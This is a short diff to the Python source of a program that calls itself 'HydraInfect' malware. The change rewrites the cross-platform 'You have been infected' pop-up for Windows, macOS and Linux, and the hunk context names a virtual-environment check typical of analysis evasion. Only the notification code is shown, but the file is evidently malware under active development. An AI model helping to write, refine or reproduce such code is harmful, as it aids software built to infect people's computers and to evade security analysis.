@@ -135,15 +135,15 @@ def is_virtual_environment():
 def display_message():
     os_type = platform.system()
     if os_type == "Windows":
-        ctypes.windll.user32.MessageBoxW(0, "Youve been infected by HydraInfect!", "Malware Alert", 1)
+        ctypes.windll.user32.MessageBoxW(0, "You have been infected by HydraInfect!", "Malware Alert", 1)
     elif os_type == "Darwin":  # macOS
         try:
-            subprocess.run(['osascript', '-e', 'display dialog "You\'ve been infected by HydraInfect!"'])
+            subprocess.run(['osascript', '-e', 'display dialog "You have been infected by HydraInfect!"'])
         except Exception as e:
             print(f"Failed to display message on macOS: {e}")
     elif os_type == "Linux":
         try:
-            subprocess.run(['zenity', '--info', '--text=You\'ve been infected by HydraInfect!'])
+            subprocess.run(['zenity', '--info', '--text=You have been infected by HydraInfect!'])
         except Exception as e:
             print(f"Failed to display message on Linux: {e}")
     else:
